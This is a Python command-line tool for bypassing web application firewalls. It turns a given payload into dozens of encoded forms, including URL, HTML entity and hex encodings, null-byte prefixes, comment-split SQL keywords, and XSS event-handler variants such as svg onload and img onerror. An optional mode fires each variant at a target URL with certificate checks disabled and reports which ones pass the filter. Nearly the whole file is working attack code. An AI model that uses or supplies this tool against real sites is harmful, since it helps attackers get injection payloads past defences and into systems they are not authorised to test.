#!/usr/bin/env python3
"""WAF bypass encoder — generate multiple encoding variants of a payload."""
import argparse
import urllib.parse
import json
import sys

def generate_variants(payload):
    variants = {
        "original": payload,
        "url_encode": urllib.parse.quote(payload),
        "double_url_encode": urllib.parse.quote(urllib.parse.quote(payload)),
        "unicode_escape": payload.replace("<", "\\u003c").replace(">", "\\u003e").replace("'", "\\u0027").replace('"', "\\u0022"),
        "html_entity_named": payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&apos;"),
        "html_entity_decimal": "".join(f"&#{ord(c)};" if not c.isalnum() else c for c in payload),
        "html_entity_hex": "".join(f"&#x{ord(c):x};" if not c.isalnum() else c for c in payload),
        "hex_encode": "".join(f"%{ord(c):02x}" for c in payload),
        "mixed_case": "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)),
        "null_byte_prefix": "%00" + payload,
        "tab_substitute": payload.replace(" ", "\t"),
        "newline_substitute": payload.replace(" ", "\n"),
        "slash_variants": payload.replace("/", "//").replace("/", "/./"),
    }

    # XSS-specific variants
    if "<" in payload or "script" in payload.lower():
        variants.update({
            "svg_onload": payload.replace("<script>", "<svg/onload=").replace("</script>", ">"),
            "img_onerror": payload.replace("<script>", '<img src=x onerror="').replace("</script>", '">'),
            "details_ontoggle": payload.replace("<script>", '<details open ontoggle="').replace("</script>", '">'),
            "body_onload": payload.replace("<script>", '<body onload="').replace("</script>", '">'),
            "javascript_proto": payload.replace("<script>", "javascript:").replace("</script>", ""),
            "data_uri": f"data:text/html,{urllib.parse.quote(payload)}",
        })

    # SQLi-specific variants
    if "'" in payload or "union" in payload.lower() or "select" in payload.lower():
        variants.update({
            "comment_bypass": payload.replace(" ", "/**/"),
            "inline_comment": payload.replace("UNION", "UN/**/ION").replace("SELECT", "SEL/**/ECT"),
            "case_variation": payload.replace("union", "UnIoN").replace("select", "SeLeCt"),
            "hex_strings": payload,  # placeholder — real impl depends on DB
        })

    return variants

def main():
    parser = argparse.ArgumentParser(description="WAF bypass encoder")
    parser.add_argument("payload", help="Payload to encode")
    parser.add_argument("--json-output", action="store_true", help="Output as JSON")
    parser.add_argument("--test-url", default=None, help="URL to test each variant against")
    parser.add_argument("--param", default="q", help="Parameter name for --test-url")
    args = parser.parse_args()

    variants = generate_variants(args.payload)

    if args.json_output:
        print(json.dumps(variants, indent=2))
    else:
        print(f"WAF Bypass Variants for: {args.payload}")
        print(f"{'='*60}")
        for name, encoded in variants.items():
            print(f"  {name:30s} → {encoded}")

    if args.test_url:
        import requests
        print(f"\n{'='*60}")
        print(f"Testing against: {args.test_url}")
        print(f"Parameter: {args.param}")
        print(f"{'='*60}\n")

        for name, encoded in variants.items():
            try:
                url = f"{args.test_url}?{args.param}={urllib.parse.quote(encoded)}"
                resp = requests.get(url, verify=False, timeout=10,
                    headers={"User-Agent": "Mozilla/5.0"})
                blocked = resp.status_code in [403, 406, 429] or "blocked" in resp.text.lower() or "waf" in resp.text.lower()
                icon = "[BLOCKED]" if blocked else "[PASSED]"
                print(f"  {icon} {name:30s} → {resp.status_code} ({len(resp.text)}b)")
            except Exception as e:
                print(f"  [ERROR]  {name:30s} → {e}")

if __name__ == "__main__":
    main()
